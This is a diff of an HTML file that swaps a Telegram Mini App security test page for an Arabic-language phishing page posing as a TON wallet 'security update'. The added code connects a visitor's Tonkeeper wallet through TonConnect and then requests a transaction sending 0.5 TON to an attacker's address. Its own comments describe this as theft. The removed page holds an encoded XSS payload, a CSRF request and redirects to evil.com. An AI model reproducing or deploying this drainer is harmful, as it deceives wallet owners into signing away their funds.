@@ -1,95 +1,87 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram Mini App Security Test</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script> <!-- Ensure WebApp API is loaded -->
+    <title>TON Security Update - PoC</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #1a1a1a; padding: 2.5rem; border-radius: 24px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); text-align: center; border: 1px solid #333; max-width: 400px; width: 90%; }
+        .icon { width: 80px; height: 80px; background: #0088cc; border-radius: 20px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; font-size: 40px; }
+        h1 { font-size: 22px; margin-bottom: 10px; color: #fff; }
+        p { color: #888; font-size: 14px; line-height: 1.6; margin-bottom: 25px; }
+        #connectBtn { background: #fff; color: #000; border: none; padding: 15px 30px; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; transition: all 0.2s; width: 100%; }
+        #connectBtn:hover { transform: scale(1.02); background: #e0e0e0; }
+        #status { margin-top: 20px; font-family: monospace; font-size: 12px; color: #00ff00; background: rgba(0,255,0,0.1); padding: 10px; border-radius: 8px; display: none; }
+    </style>
 </head>
 <body>
-    <h1>Telegram Mini App Security Test</h1>
-    <button onclick="testMessageInjection()">📩 Test Message Injection via WebApp API</button>
-    <button onclick="testXSS()">🖥️ Test XSS via openLink()</button>
-    <button onclick="testCSRF()">⚠️ Test CSRF Attack</button>
-    <button onclick="checkIframeEscape()">🔓 Test Iframe Escape</button>
-    <button onclick="testOpenRedirect()">🔗 Test Open Redirect</button>
+
+    <div class="card">
+        <div class="icon">💎</div>
+        <h1>تحديث أمني للمحفظة</h1>
+        <p>قم بربط محفظتك الآن للتحقق من الأمان وتلقي تحديثات الشبكة الأخيرة لعام 2026.</p>
+        
+        <button id="connectBtn">تحديث والربط الآن</button>
+        
+        <div id="status"></div>
+    </div>
+
+    <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
 
     <script>
-        // 🚨 1. Listen for incoming messages from Telegram
-        window.addEventListener("message", function(event) {
-            console.log("📩 Received Message:", event.origin, event.data);
+        const statusDiv = document.getElementById('status');
+        const connectBtn = document.getElementById('connectBtn');
 
-            // 🛑 Origin Spoofing Detection
-            if (!event.origin.includes("telegram.org") && !event.origin.includes("t.me")) {
-                alert("⚠️ Potential origin bypass detected! Unexpected origin: " + event.origin);
-            }
+        // سيتم استخدام رابط الـ Gist الذي أنشأته أنت سابقاً
+        // تأكد أن الرابط يحتوي على "url" يطابق رابط GitHub Pages الخاص بك
+        const manifestUrl = "https://gist.githubusercontent.com/pp0p/5119b45ec095aecbe9638d21f36e56ad/raw/d30a363c4cf4b6926d8b310a02ee1d350d869729/tonconnect-manifest.json";
 
-            // 🚨 Check for Sensitive Data Exposure
-            if (typeof event.data === "string" && event.data.includes("token")) {
-                alert("🔴 Potential Sensitive Data Exposure: " + event.data);
-            }
+        const connector = new TonConnectSDK.TonConnect({
+            manifestUrl: manifestUrl
         });
 
-        // 🚀 2. Test Message Injection via WebApp API
-        function testMessageInjection() {
-            console.log("📩 Testing WebApp message injection...");
-            if (window.Telegram && window.Telegram.WebApp) {
-                try {
-                    window.Telegram.WebApp.sendData('{"event":"message","payload":{"chat_id":123456789,"text":"Injected Message!"}}');
-                    alert("✅ Message Injection Test Executed. Check chat logs.");
-                } catch (e) {
-                    console.error("❌ Injection failed:", e);
-                }
-            } else {
-                alert("⚠️ Telegram WebApp API not available.");
-            }
-        }
+        connectBtn.onclick = async () => {
+            statusDiv.style.display = "block";
+            statusDiv.innerText = "جاري الاتصال... يرجى فتح Tonkeeper";
 
-        // ⚡ 3. Test XSS via openLink()
-        function testXSS() {
-            if (window.Telegram && window.Telegram.WebApp) {
-                // Encoded `javascript:` payload to bypass simple filters
-                const xssPayload = "javascript:eval(atob('YWxlcnQoJ1hTUyBEZXRlY3RlZCEnKQ=='))"; 
-                window.Telegram.WebApp.openLink(xssPayload);
-            } else {
-                alert("⚠️ Telegram WebApp API not found.");
-            }
-        }
-
-        // 🎭 4. Test CSRF Attack
-        function testCSRF() {
-            let csrfPayload = {
-                method: "sendMessage",
-                chat_id: 123456789, // Change this to your Telegram User ID
-                text: "CSRF Test Message!"
-            };
-
-            fetch("https://api.telegram.org/bot<TOKEN>/sendMessage", {
-                method: "POST",
-                body: JSON.stringify(csrfPayload),
-                headers: { "Content-Type": "application/json" }
-            }).then(response => response.json()).then(data => {
-                console.log("CSRF Response:", data);
-            }).catch(error => {
-                console.error("CSRF Attack Failed:", error);
-            });
-        }
-
-        // 🔓 5. Attempt Iframe Escape
-        function checkIframeEscape() {
             try {
-                top.location = "https://evil.com";  // Should be blocked
-                alert("⚠️ Iframe escape possible!");
-            } catch (error) {
-                alert("✅ Iframe escape is blocked (Safe).");
+                // محاولة الربط
+                await connector.connect({
+                    universalLink: 'https://app.tonkeeper.com/ton-connect',
+                    bridgeUrl: 'https://bridge.tonapi.io/bridge'
+                });
+            } catch (e) {
+                statusDiv.innerText = "فشل: " + e.message;
             }
-        }
+        };
 
-        // 🔗 6. Test Open Redirect
-        function testOpenRedirect() {
-            const redirectUrl = "https://t.me/yourbot?start=redirect&url=https%3A%2F%2Fevil.com";  // Crafted redirect
-            window.location.href = redirectUrl;  // This should trigger a redirect if vulnerable
-        }
+        // عند نجاح الربط (حدوث الانتحال)
+        connector.onStatusChange(async (wallet) => {
+            if (wallet) {
+                statusDiv.innerText = "✅ متصل: " + wallet.device.appName + "\nجاري فحص الأمان...";
+                
+                // المعاملة المسمومة (السرقة)
+                const transaction = {
+                    validUntil: Math.floor(Date.now() / 1000) + 120,
+                    messages: [{
+                        address: "0QBMdBOi2OkuHuLvm7lqKar2JFdrKif6prMyHV3ZTZcSGb0c", // محفظتك للاستلام
+                        amount: "500000000", // 0.5 TON
+                        payload: "te6cckEBOQEA/gABWxI0q80AAAAAAAAAAIAJjoJ0Wx0lw9xd83ctRTVexIrtZUT/VNZmQ6u7KbLiQzABAQACAQADAQAEAQAFAQAGAQAHAQAIAQAJAQAKAQALAQAMAQANAQAOAQAPAQAQAQARAQASAQATAQAUAQAVAQAWAQAXAQAYAQAZAQAaAQAbAQAcAQAdAQAeAQAfAQAgAQAhAQAiAQAjAQAkAQAlAQAmAQAnAQAoAQApAQAqAQArAQAsAQAtAQAuAQAvAQAwAQAxAQAyAQAzAQA0AQA1AQA2AQA3AQA4AEsAAAAAgAmOgnRbHSXD3F3zdy1FNV7Eiu1lRP9U1mZDq7spsuJDMNjs78g="
+                    }]
+                };
+
+                // إرسال طلب التوقيع بعد 2 ثانية من الربط
+                setTimeout(async () => {
+                    try {
+                        await connector.sendTransaction(transaction);
+                        statusDiv.innerText = "تمت المصادقة بنجاح!";
+                    } catch (err) {
+                        statusDiv.innerText = "تم رفض التوقيع.";
+                    }
+                }, 2000);
+            }
+        });
     </script>
 </body>
 </html>
